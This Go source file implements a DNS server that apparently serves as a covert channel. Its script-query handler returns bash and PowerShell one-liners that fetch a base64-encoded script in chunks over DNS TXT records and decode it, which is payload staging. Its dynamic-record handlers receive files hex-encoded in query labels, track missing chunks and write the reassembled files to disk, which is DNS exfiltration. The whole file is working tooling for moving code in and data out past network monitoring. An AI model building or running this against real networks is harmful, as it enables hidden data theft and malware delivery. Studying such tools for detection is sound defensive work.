package server

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"youkaidns/dns"
	"youkaidns/stats"
)

// Record represents a DNS record
type Record struct {
	Type  uint16
	Value interface{} // string for A (IPv4), []string for TXT
}

// FileAssembly tracks file parts being assembled
type FileAssembly struct {
	Filename    string
	Hash        string
	TotalParts  int
	ChunkSize   int
	TotalBytes  int64          // Total file size in bytes
	Parts       map[int][]byte // part number -> data
	CompletedAt time.Time      // When file was completed
	mu          sync.Mutex
}

// Server represents a DNS server
type Server struct {
	port     int
	stats    *stats.Stats
	conn     *net.UDPConn
	shutdown chan struct{}
	verbose  bool
	domain   string // Domain suffix for dynamic records

	// Zone data (dynamically generated)
	mu      sync.RWMutex
	records map[string]map[uint16][]Record // domain -> type -> records

	// File assembly tracking
	fileAssemblies map[string]*FileAssembly // hash -> assembly
	assemblyMu     sync.RWMutex
	outputDir      string

	// Script chunks for serving via DNS
	scriptChunks map[string][]string // script name -> base64 chunks
	scriptMu     sync.RWMutex
}

// NewServer creates a new DNS server
func NewServer(port int, s *stats.Stats, verbose bool, domain string, outputDir string) *Server {
	// Create output directory if it doesn't exist
	os.MkdirAll(outputDir, 0755)

	server := &Server{
		port:           port,
		stats:          s,
		shutdown:       make(chan struct{}),
		verbose:        verbose,
		domain:         domain,
		records:        make(map[string]map[uint16][]Record),
		fileAssemblies: make(map[string]*FileAssembly),
		outputDir:      outputDir,
		scriptChunks:   make(map[string][]string),
	}

	// Load and prepare script files
	server.loadScripts()

	return server
}

// loadScripts loads script files and prepares them for DNS serving
func (s *Server) loadScripts() {
	scripts := map[string]string{
		"linux":   "script.sh",
		"windows": "script.ps1",
	}

	for name, filename := range scripts {
		var data []byte
		var err error

		// Try different paths to find the script
		paths := []string{
			filename,
			"./" + filename,
			"../" + filename,
		}

		for _, path := range paths {
			data, err = os.ReadFile(path)
			if err == nil {
				break
			}
		}

		if err != nil {
			log.Printf("Warning: Could not load script %s: %v", filename, err)
			continue
		}

		// Encode as base64
		encoded := base64.StdEncoding.EncodeToString(data)

		// Split into chunks of ~200 characters (safe for DNS TXT records)
		chunkSize := 200
		var chunks []string
		for i := 0; i < len(encoded); i += chunkSize {
			end := i + chunkSize
			if end > len(encoded) {
				end = len(encoded)
			}
			chunks = append(chunks, encoded[i:end])
		}

		s.scriptMu.Lock()
		s.scriptChunks[name] = chunks
		s.scriptMu.Unlock()

		if s.verbose {
			log.Printf("Loaded script %s: %d chunks", filename, len(chunks))
		}
	}
}

// AddRecord adds a record to the zone
func (s *Server) AddRecord(domain string, recordType uint16, value interface{}) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.records[domain] == nil {
		s.records[domain] = make(map[uint16][]Record)
	}

	s.records[domain][recordType] = append(s.records[domain][recordType], Record{
		Type:  recordType,
		Value: value,
	})
}

// lookup finds records for a domain and type
func (s *Server) lookup(domain string, recordType uint16) []Record {
	s.mu.RLock()
	defer s.mu.RUnlock()

	// Try exact match first
	if domainRecords, ok := s.records[domain]; ok {
		if records, ok := domainRecords[recordType]; ok {
			return records
		}
	}

	// Try wildcard match
	if domainRecords, ok := s.records["*"]; ok {
		if records, ok := domainRecords[recordType]; ok {
			return records
		}
	}

	return nil
}

// convertToResourceRecords converts zone records to DNS resource records
func (s *Server) convertToResourceRecords(domain string, records []Record) []dns.ResourceRecord {
	var rrs []dns.ResourceRecord

	for _, record := range records {
		rr := dns.ResourceRecord{
			Name:  domain,
			Type:  record.Type,
			Class: 1, // IN
			TTL:   0, // TTL=0 to prevent caching
		}

		switch record.Type {
		case dns.TypeA:
			// A record: IPv4 address as string
			if ipStr, ok := record.Value.(string); ok {
				rr.Data = parseIPv4(ipStr)
				rr.DataLen = uint16(len(rr.Data))
			}
		case dns.TypeTXT:
			// TXT record: array of strings
			if txtStrings, ok := record.Value.([]string); ok {
				var txtData []byte
				for _, txt := range txtStrings {
					if len(txt) > 255 {
						txt = txt[:255]
					}
					txtData = append(txtData, byte(len(txt)))
					txtData = append(txtData, []byte(txt)...)
				}
				rr.Data = txtData
				rr.DataLen = uint16(len(txtData))
			}
		}

		if len(rr.Data) > 0 {
			rrs = append(rrs, rr)
		}
	}

	return rrs
}

// parseIPv4 parses an IPv4 address string to 4 bytes
func parseIPv4(ip string) []byte {
	var parts [4]byte
	var a, b, c, d int
	fmt.Sscanf(ip, "%d.%d.%d.%d", &a, &b, &c, &d)
	parts[0] = byte(a)
	parts[1] = byte(b)
	parts[2] = byte(c)
	parts[3] = byte(d)
	return parts[:]
}

// Start starts the DNS server
func (s *Server) Start() error {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", s.port))
	if err != nil {
		return fmt.Errorf("failed to resolve address: %w", err)
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen: %w", err)
	}

	s.conn = conn
	log.Printf("DNS server listening on UDP port %d", s.port)

	go s.handleRequests()

	return nil
}

// Stop stops the DNS server
func (s *Server) Stop() {
	close(s.shutdown)
	if s.conn != nil {
		s.conn.Close()
	}
	log.Println("DNS server stopped")
}

// handleRequests handles incoming DNS requests
func (s *Server) handleRequests() {
	buffer := make([]byte, 512) // DNS messages are typically < 512 bytes

	for {
		select {
		case <-s.shutdown:
			return
		default:
			s.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
			n, clientAddr, err := s.conn.ReadFromUDP(buffer)
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					continue
				}
				log.Printf("Error reading from UDP: %v", err)
				continue
			}

			// Handle request in a goroutine for better concurrency
			go s.handleRequest(buffer[:n], clientAddr)
		}
	}
}

// handleRequest handles a single DNS request
func (s *Server) handleRequest(data []byte, clientAddr *net.UDPAddr) {
	startTime := time.Now()

	// Parse the query
	query, err := dns.ParseMessage(data)
	if err != nil {
		log.Printf("Error parsing query: %v", err)
		return
	}

	// Process each question
	var allAnswers []dns.ResourceRecord
	success := false

	for _, question := range query.Questions {
		// Record the query
		s.stats.RecordQuery(question.Name, question.Type)

		// Verbose logging
		if s.verbose {
			typeName := s.getTypeName(question.Type)
			log.Printf("DNS Query: %s -> %s from %s", question.Name, typeName, clientAddr.IP)
		}

		// Check if this is a script query
		if scriptAnswers := s.handleScriptQuery(question.Name, question.Type); scriptAnswers != nil {
			allAnswers = append(allAnswers, scriptAnswers...)
			success = true
			continue
		}

		// Check if this is a missing chunks query
		if missingAnswers := s.handleMissingQuery(question.Name, question.Type); missingAnswers != nil {
			allAnswers = append(allAnswers, missingAnswers...)
			success = true
			continue
		}

		// Check if this is a dynamic file transfer query
		if s.handleDynamicRecord(question.Name) {
			// Dynamic record handled, respond with "OK" TXT record
			if question.Type == dns.TypeTXT {
				okData := []byte{byte(len("OK"))}
				okData = append(okData, []byte("OK")...)
				rr := dns.ResourceRecord{
					Name:    question.Name,
					Type:    dns.TypeTXT,
					Class:   1, // IN
					TTL:     0, // TTL=0 to prevent caching
					Data:    okData,
					DataLen: uint16(len(okData)),
				}
				allAnswers = append(allAnswers, rr)
			}
			success = true
			continue
		}

		// Lookup in zone
		records := s.lookup(question.Name, question.Type)
		if len(records) > 0 {
			answers := s.convertToResourceRecords(question.Name, records)
			allAnswers = append(allAnswers, answers...)
			success = true
		}
	}

	// Build response
	var response *dns.Message
	if len(allAnswers) > 0 {
		response, err = dns.BuildResponse(query, allAnswers, dns.RcodeNoError)
	} else {
		response, err = dns.BuildResponse(query, nil, dns.RcodeNXDomain)
	}

	if err != nil {
		log.Printf("Error building response: %v", err)
		return
	}

	// Convert to bytes
	responseBytes, err := response.ToBytes()
	if err != nil {
		log.Printf("Error converting response to bytes: %v", err)
		return
	}

	// Send response
	_, err = s.conn.WriteToUDP(responseBytes, clientAddr)
	if err != nil {
		log.Printf("Error sending response: %v", err)
		return
	}

	// Record statistics
	duration := time.Since(startTime)
	s.stats.RecordResponse(success, duration)

	// Verbose logging for response
	if s.verbose {
		status := "SUCCESS"
		if !success {
			status = "NXDOMAIN"
		}
		log.Printf("DNS Response: %s (%d answers) in %v", status, len(allAnswers), duration)
	}
}

// getTypeName returns a string representation of DNS record type
func (s *Server) getTypeName(recordType uint16) string {
	switch recordType {
	case dns.TypeA:
		return "A"
	case dns.TypeTXT:
		return "TXT"
	default:
		return fmt.Sprintf("TYPE%d", recordType)
	}
}

// handleScriptQuery handles queries for script files
// Format: [chunk_num.]linux.script.<domain> or [chunk_num.]windows.script.<domain>
// Returns TXT records with script chunks, or nil if not a script query
func (s *Server) handleScriptQuery(queryDomain string, queryType uint16) []dns.ResourceRecord {
	// Only handle TXT queries
	if queryType != dns.TypeTXT {
		return nil
	}

	// Check if query matches script format
	var scriptName string
	var chunkNum int = -1

	if s.domain != "" {
		// Normalize domains for comparison (lowercase)
		queryDomainLower := strings.ToLower(queryDomain)
		domainLower := strings.ToLower(s.domain)

		// Check if query ends with the configured domain
		if !strings.HasSuffix(queryDomainLower, "."+domainLower) {
			return nil
		}

		// Extract the part before the domain
		prefix := queryDomainLower[:len(queryDomainLower)-len("."+domainLower)]
		parts := strings.Split(prefix, ".")

		// Should be: [chunk_num.]linux.script or [chunk_num.]windows.script
		if len(parts) < 2 {
			return nil
		}

		// Check if last part is "script"
		if parts[len(parts)-1] != "script" {
			return nil
		}

		// Get script name (should be before "script")
		if len(parts) < 2 {
			return nil
		}
		scriptName = parts[len(parts)-2]
		if scriptName != "windows" && scriptName != "linux" {
			return nil
		}

		// Check if there's a chunk number prefix
		// Format: chunk_num.linux.script.<domain>
		if len(parts) >= 3 {
			if num, err := strconv.Atoi(parts[0]); err == nil {
				chunkNum = num
			}
		}
	} else {
		// No domain configured - check format: [chunk_num.]linux.script or [chunk_num.]windows.script
		parts := strings.Split(queryDomain, ".")
		if len(parts) < 2 {
			return nil
		}

		// Check if last part is "script"
		if parts[len(parts)-1] != "script" {
			return nil
		}

		// Get script name
		if len(parts) < 2 {
			return nil
		}
		scriptName = parts[len(parts)-2]
		if scriptName != "windows" && scriptName != "linux" {
			return nil
		}

		// Check if there's a chunk number prefix
		// Format: chunk_num.linux.script
		if len(parts) >= 3 {
			if num, err := strconv.Atoi(parts[0]); err == nil {
				chunkNum = num
			}
		}
	}

	// Get script chunks
	s.scriptMu.RLock()
	chunks, exists := s.scriptChunks[scriptName]
	s.scriptMu.RUnlock()

	if !exists || len(chunks) == 0 {
		return nil
	}

	// If chunk number specified, return that chunk only
	// Note: chunk numbers in one-liner are 1-based, but array is 0-based
	if chunkNum >= 1 {
		chunkIdx := chunkNum - 1 // Convert to 0-based index
		if chunkIdx < len(chunks) {
			chunkData := []byte{byte(len(chunks[chunkIdx]))}
			chunkData = append(chunkData, []byte(chunks[chunkIdx])...)

			rr := dns.ResourceRecord{
				Name:    queryDomain,
				Type:    dns.TypeTXT,
				Class:   1, // IN
				TTL:     0, // TTL=0 to prevent caching
				Data:    chunkData,
				DataLen: uint16(len(chunkData)),
			}
			return []dns.ResourceRecord{rr}
		}
		return nil
	}

	// Return a one-liner command to retrieve the full script
	// This avoids DNS resolver limits on large responses
	var oneliner string
	baseDomain := scriptName + ".script"
	if s.domain != "" {
		baseDomain = baseDomain + "." + s.domain
	}

	if scriptName == "windows" {
		// PowerShell one-liner to retrieve and decode the script
		// Format: $i.windows.script.<domain>
		// Shortened version to fit in DNS TXT record
		oneliner = fmt.Sprintf("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((1..%d|%%{Resolve-DnsName -ty TXT -na \"$_.%s\"|? Section -eq Answer|%% Strings})))", len(chunks), baseDomain)
	} else {
		// Bash one-liner to retrieve and decode the script
		// Format: $i.linux.script.<domain>
		// Use tr -d ' ' to remove spaces between base64 chunks
		oneliner = fmt.Sprintf("echo $(for i in $(seq 1 %d); do dig +short $i.%s TXT | grep -oE '\"[^\"]+\"' | tr -d '\"'; done) | tr -d ' ' | base64 -d", len(chunks), baseDomain)
	}

	// Return the one-liner as a single TXT record
	onelinerData := []byte{byte(len(oneliner))}
	onelinerData = append(onelinerData, []byte(oneliner)...)

	rr := dns.ResourceRecord{
		Name:    queryDomain,
		Type:    dns.TypeTXT,
		Class:   1, // IN
		TTL:     0, // TTL=0 to prevent caching
		Data:    onelinerData,
		DataLen: uint16(len(onelinerData)),
	}

	if s.verbose {
		log.Printf("Script query for %s: returning one-liner command (%d chunks total)", scriptName, len(chunks))
	}

	return []dns.ResourceRecord{rr}
}

// handleMissingQuery handles queries for missing chunks
// Format: [counter.]missing.<hash8>.<domain> or missing.<hash8>.<domain>
// Returns TXT records with all missing chunk numbers, or nil if not a missing query
func (s *Server) handleMissingQuery(queryDomain string, queryType uint16) []dns.ResourceRecord {
	// Only handle TXT queries
	if queryType != dns.TypeTXT {
		return nil
	}

	// Check if query matches [counter.]missing.<hash8>.<domain> format
	var hash8 string
	if s.domain != "" {
		// Normalize domains for comparison (lowercase)
		queryDomainLower := strings.ToLower(queryDomain)
		domainLower := strings.ToLower(s.domain)

		// Check if query ends with the configured domain
		if !strings.HasSuffix(queryDomainLower, "."+domainLower) {
			return nil
		}

		// Extract the part before the domain
		prefix := queryDomainLower[:len(queryDomainLower)-len("."+domainLower)]
		parts := strings.Split(prefix, ".")

		// Should be: [counter.]missing.<hash8> or missing.<hash8>
		// Find "missing" in the parts
		missingIdx := -1
		for i, part := range parts {
			if part == "missing" {
				missingIdx = i
				break
			}
		}

		if missingIdx == -1 {
			return nil
		}

		// After "missing" should be hash8
		if missingIdx+1 >= len(parts) {
			return nil
		}
		hash8 = parts[missingIdx+1]
	} else {
		// No domain configured - check format: [counter.]missing.<hash8>
		parts := strings.Split(queryDomain, ".")

		// Find "missing" in the parts
		missingIdx := -1
		for i, part := range parts {
			if part == "missing" {
				missingIdx = i
				break
			}
		}

		if missingIdx == -1 {
			return nil
		}

		// After "missing" should be hash8
		if missingIdx+1 >= len(parts) {
			return nil
		}
		hash8 = parts[missingIdx+1]
	}

	// Validate hash8 is 8 hex characters
	if len(hash8) != 8 {
		return nil
	}

	// Get file assembly
	s.assemblyMu.RLock()
	assembly, exists := s.fileAssemblies[hash8]
	s.assemblyMu.RUnlock()

	if !exists {
		// No assembly found, return empty response
		return nil
	}

	// Check if we have total parts info
	if assembly.TotalParts <= 0 {
		return nil
	}

	// Find missing chunks (1-based: parts 1 to TotalParts)
	assembly.mu.Lock()
	var missingChunks []int
	isCompleted := !assembly.CompletedAt.IsZero()
	if assembly.TotalParts > 0 {
		for i := 1; i <= assembly.TotalParts; i++ {
			if _, exists := assembly.Parts[i]; !exists {
				missingChunks = append(missingChunks, i)
			}
		}
	}
	assembly.mu.Unlock()

	// If file is completed, return empty response (no missing chunks)
	if isCompleted && len(missingChunks) == 0 {
		// File is complete, return empty response (not NXDOMAIN)
		return []dns.ResourceRecord{}
	}

	if len(missingChunks) == 0 {
		// All chunks received but not yet marked complete, return empty
		return []dns.ResourceRecord{}
	}

	// Build TXT records
	var answers []dns.ResourceRecord
	for _, chunkNum := range missingChunks {
		chunkNumStr := fmt.Sprintf("%d", chunkNum)
		txtData := []byte{byte(len(chunkNumStr))}
		txtData = append(txtData, []byte(chunkNumStr)...)

		rr := dns.ResourceRecord{
			Name:    queryDomain,
			Type:    dns.TypeTXT,
			Class:   1, // IN
			TTL:     0, // TTL=0 to prevent caching
			Data:    txtData,
			DataLen: uint16(len(txtData)),
		}
		answers = append(answers, rr)
	}

	if s.verbose {
		log.Printf("Missing chunks query for hash %s: returning %d missing chunks", hash8, len(answers))
	}

	return answers
}

// handleDynamicRecord processes dynamic file transfer records
// Returns true if the query matches the dynamic record format
// Format: xxx.start.<hex>.<domain> or xxx.<part_num>.<hex>.<domain>
func (s *Server) handleDynamicRecord(queryDomain string) bool {
	// If domain is configured, check if query ends with it
	if s.domain != "" {
		// Normalize domains for comparison (lowercase)
		queryDomainLower := strings.ToLower(queryDomain)
		domainLower := strings.ToLower(s.domain)

		// Check if query ends with the configured domain
		if !strings.HasSuffix(queryDomainLower, "."+domainLower) && queryDomainLower != domainLower {
			return false
		}

		// Extract the part before the domain
		// Remove the domain suffix (including the dot)
		prefix := queryDomainLower
		if strings.HasSuffix(prefix, "."+domainLower) {
			prefix = prefix[:len(prefix)-len("."+domainLower)]
		} else if prefix == domainLower {
			// Query is exactly the domain, not a dynamic record
			return false
		}

		// Split the prefix part
		parts := strings.Split(prefix, ".")
		if len(parts) < 3 {
			return false
		}

		// Check for start record: filename.total_parts.chunk_size.total_bytes.start.hash8
		if len(parts) >= 6 {
			// Find "start" marker
			startIdx := -1
			for i, part := range parts {
				if part == "start" {
					startIdx = i
					break
				}
			}
			if startIdx != -1 && startIdx >= 3 {
				return s.handleStartRecord(parts)
			}
		}

		// Check for data record: data_hex.part_num.hash8
		// Need at least 3 parts: data, part_num, hash8
		if len(parts) >= 3 {
			return s.handleDataRecord(parts)
		}

		return false
	}

	// If no domain configured, use original behavior (backward compatibility)
	parts := strings.Split(queryDomain, ".")
	if len(parts) < 4 {
		return false
	}

	// Check for start record: filename.total_parts.chunk_size.total_bytes.start.hash8
	// Find "start" marker to check if it's a start record
	for i, part := range parts {
		if part == "start" && i >= 3 && i < len(parts)-1 {
			return s.handleStartRecord(parts)
		}
	}

	// Check for data record: data_hex.part_num.hash8
	// The pattern is: data_hex.part_num.hash8
	// We need at least 3 parts: data, part_num, hash8
	if len(parts) >= 3 {
		// Try to parse as data record
		return s.handleDataRecord(parts)
	}

	return false
}

// handleStartRecord processes a start record
// Format: filename_hex.total_parts.chunk_size.total_bytes.start.hash8
func (s *Server) handleStartRecord(parts []string) bool {
	// Find "start" marker
	startIdx := -1
	for i, part := range parts {
		if part == "start" {
			startIdx = i
			break
		}
	}

	// Need: filename_hex, total_parts, chunk_size, total_bytes, start, hash8
	// So startIdx must be at position 4 or later (0-indexed)
	if startIdx == -1 || startIdx < 3 || startIdx >= len(parts)-1 {
		return false
	}

	// Parse components
	// Before start: filename_hex (may span multiple labels), total_parts, chunk_size, total_bytes
	totalBytesStr := parts[startIdx-1]
	chunkSizeStr := parts[startIdx-2]
	totalPartsStr := parts[startIdx-3]
	filenameHexParts := parts[:startIdx-3]
	filenameHex := strings.Join(filenameHexParts, "")

	// After start: hash8
	if startIdx+1 >= len(parts) {
		return false
	}
	hash8 := parts[startIdx+1]

	// Validate hash8 is 8 hex characters
	if len(hash8) != 8 {
		return false
	}

	// Parse total parts
	totalParts, err := strconv.Atoi(totalPartsStr)
	if err != nil || totalParts <= 0 {
		return false
	}

	// Parse chunk size
	chunkSize, err := strconv.Atoi(chunkSizeStr)
	if err != nil || chunkSize <= 0 {
		return false
	}

	// Parse total bytes
	totalBytes, err := strconv.ParseInt(totalBytesStr, 10, 64)
	if err != nil || totalBytes < 0 {
		return false
	}

	// Decode filename from hex
	filenameBytes, err := hex.DecodeString(filenameHex)
	if err != nil {
		log.Printf("Error decoding filename hex '%s': %v", filenameHex, err)
		return false
	}
	filename := string(filenameBytes)

	// Create or update file assembly
	s.assemblyMu.Lock()
	assembly, exists := s.fileAssemblies[hash8]
	if !exists {
		assembly = &FileAssembly{
			Filename:   filename,
			Hash:       hash8,
			TotalParts: totalParts,
			ChunkSize:  chunkSize,
			TotalBytes: totalBytes,
			Parts:      make(map[int][]byte),
		}
		s.fileAssemblies[hash8] = assembly
		log.Printf("Started file assembly: %s (hash: %s, parts: %d, chunk_size: %d, total_bytes: %d)", filename, hash8, totalParts, chunkSize, totalBytes)
	} else {
		// Update if needed
		assembly.Filename = filename
		assembly.TotalParts = totalParts
		assembly.ChunkSize = chunkSize
		assembly.TotalBytes = totalBytes
	}
	s.assemblyMu.Unlock()

	return true
}

// handleDataRecord processes a data record
// Format: data_hex.part_num.hash8
func (s *Server) handleDataRecord(parts []string) bool {
	// Need at least 3 parts: data_hex, part_num, hash8
	if len(parts) < 3 {
		return false
	}

	// Last 2 parts are: hash8, part_num
	hash8 := parts[len(parts)-1]
	partNumStr := parts[len(parts)-2]

	// Everything before that is data_hex (may span multiple labels)
	dataHexParts := parts[:len(parts)-2]
	dataHex := strings.Join(dataHexParts, "")

	// Validate hash8 is 8 hex characters
	if len(hash8) != 8 {
		return false
	}

	// Parse part number (1-based)
	partNum, err := strconv.Atoi(partNumStr)
	if err != nil || partNum < 1 {
		return false
	}

	// Decode data from hex
	dataBytes, err := hex.DecodeString(dataHex)
	if err != nil {
		log.Printf("Error decoding data hex '%s': %v", dataHex, err)
		return false
	}

	// Get or create file assembly
	s.assemblyMu.Lock()
	assembly, exists := s.fileAssemblies[hash8]
	if !exists {
		// Create assembly if it doesn't exist (maybe start record was missed)
		assembly = &FileAssembly{
			Filename:   fmt.Sprintf("unknown_%s", hash8),
			Hash:       hash8,
			TotalParts: -1, // Unknown
			TotalBytes: -1, // Unknown
			Parts:      make(map[int][]byte),
		}
		s.fileAssemblies[hash8] = assembly
		log.Printf("Created file assembly from data record: hash %s", hash8)
	}
	s.assemblyMu.Unlock()

	// Add part to assembly
	assembly.mu.Lock()
	assembly.Parts[partNum] = dataBytes
	receivedParts := len(assembly.Parts)
	assembly.mu.Unlock()

	log.Printf("Received part %d/%d for file %s (hash: %s)", partNum, assembly.TotalParts, assembly.Filename, hash8)

	// Check if file is complete
	if assembly.TotalParts > 0 && receivedParts >= assembly.TotalParts {
		// Check if we have all parts (1-based: parts 1 to TotalParts)
		assembly.mu.Lock()
		allParts := true
		for i := 1; i <= assembly.TotalParts; i++ {
			if _, exists := assembly.Parts[i]; !exists {
				allParts = false
				break
			}
		}
		assembly.mu.Unlock()

		if allParts {
			go s.assembleAndSaveFile(hash8)
		}
	}

	return true
}

// assembleAndSaveFile assembles all parts and saves the file
func (s *Server) assembleAndSaveFile(hash8 string) {
	s.assemblyMu.RLock()
	assembly, exists := s.fileAssemblies[hash8]
	if !exists {
		s.assemblyMu.RUnlock()
		return
	}
	s.assemblyMu.RUnlock()

	assembly.mu.Lock()
	defer assembly.mu.Unlock()

	// Assemble parts in order (1-based: parts 1 to TotalParts)
	var fileData []byte
	for i := 1; i <= assembly.TotalParts; i++ {
		part, exists := assembly.Parts[i]
		if !exists {
			log.Printf("Warning: Missing part %d for file %s (hash: %s)", i, assembly.Filename, hash8)
			return
		}
		fileData = append(fileData, part...)
	}

	// Create safe filename
	safeFilename := sanitizeFilename(assembly.Filename)
	if safeFilename == "" {
		safeFilename = fmt.Sprintf("file_%s", hash8)
	}

	// Save file
	filePath := filepath.Join(s.outputDir, safeFilename)
	err := os.WriteFile(filePath, fileData, 0644)
	if err != nil {
		log.Printf("Error saving file %s: %v", filePath, err)
		return
	}

	log.Printf("Successfully saved file: %s (size: %d bytes, hash: %s)", filePath, len(fileData), hash8)

	// Mark as completed but keep assembly for a short time to allow missing chunk queries
	assembly.CompletedAt = time.Now()

	// Clean up assembly after 30 seconds (allows time for final missing chunk queries)
	go func() {
		time.Sleep(30 * time.Second)
		s.assemblyMu.Lock()
		defer s.assemblyMu.Unlock()
		// Double-check it's still the same assembly and completed
		if existing, exists := s.fileAssemblies[hash8]; exists && existing == assembly {
			delete(s.fileAssemblies, hash8)
			log.Printf("Cleaned up completed file assembly: %s (hash: %s)", assembly.Filename, hash8)
		}
	}()
}

// sanitizeFilename creates a safe filename from the original
func sanitizeFilename(filename string) string {
	// Remove path separators and other dangerous characters
	filename = strings.ReplaceAll(filename, "/", "_")
	filename = strings.ReplaceAll(filename, "\\", "_")
	filename = strings.ReplaceAll(filename, "..", "_")

	// Remove null bytes
	filename = strings.ReplaceAll(filename, "\x00", "")

	// Limit length
	if len(filename) > 255 {
		filename = filename[:255]
	}

	return filename
}

// GetFileTransfers returns information about all active file transfers
func (s *Server) GetFileTransfers() []map[string]interface{} {
	s.assemblyMu.RLock()
	defer s.assemblyMu.RUnlock()

	var transfers []map[string]interface{}
	for hash8, assembly := range s.fileAssemblies {
		assembly.mu.Lock()
		receivedParts := len(assembly.Parts)
		var missingChunks []int
		// Find missing chunks (1-based: parts 1 to TotalParts)
		if assembly.TotalParts > 0 {
			for i := 1; i <= assembly.TotalParts; i++ {
				if _, exists := assembly.Parts[i]; !exists {
					missingChunks = append(missingChunks, i)
				}
			}
		}
		progress := 0.0
		if assembly.TotalParts > 0 {
			progress = float64(receivedParts) / float64(assembly.TotalParts) * 100.0
		}
		status := "in_progress"
		if assembly.TotalParts > 0 && receivedParts >= assembly.TotalParts && len(missingChunks) == 0 {
			status = "complete"
		}
		assembly.mu.Unlock()

		transfer := map[string]interface{}{
			"hash":           hash8,
			"filename":       assembly.Filename,
			"total_parts":    assembly.TotalParts,
			"received_parts": receivedParts,
			"chunk_size":     assembly.ChunkSize,
			"total_bytes":    assembly.TotalBytes,
			"progress":       progress,
			"status":         status,
			"missing_chunks": missingChunks,
		}
		transfers = append(transfers, transfer)
	}

	// Sort transfers by hash for consistent ordering
	sort.Slice(transfers, func(i, j int) bool {
		hashI, okI := transfers[i]["hash"].(string)
		hashJ, okJ := transfers[j]["hash"].(string)
		if !okI || !okJ {
			return false
		}
		return hashI < hashJ
	})

	return transfers
}

// GetReceivedFiles returns a list of files in the output directory
func (s *Server) GetReceivedFiles() ([]map[string]interface{}, error) {
	files, err := os.ReadDir(s.outputDir)
	if err != nil {
		return nil, err
	}

	var fileList []map[string]interface{}
	for _, file := range files {
		if file.IsDir() {
			continue
		}

		info, err := file.Info()
		if err != nil {
			continue
		}

		fileList = append(fileList, map[string]interface{}{
			"name":     file.Name(),
			"size":     info.Size(),
			"mod_time": info.ModTime().Format(time.RFC3339),
		})
	}

	// Sort by modification time (newest first)
	for i := 0; i < len(fileList); i++ {
		for j := i + 1; j < len(fileList); j++ {
			if fileList[i]["mod_time"].(string) < fileList[j]["mod_time"].(string) {
				fileList[i], fileList[j] = fileList[j], fileList[i]
			}
		}
	}

	return fileList, nil
}

// GetOutputDir returns the output directory path
func (s *Server) GetOutputDir() string {
	return s.outputDir
}
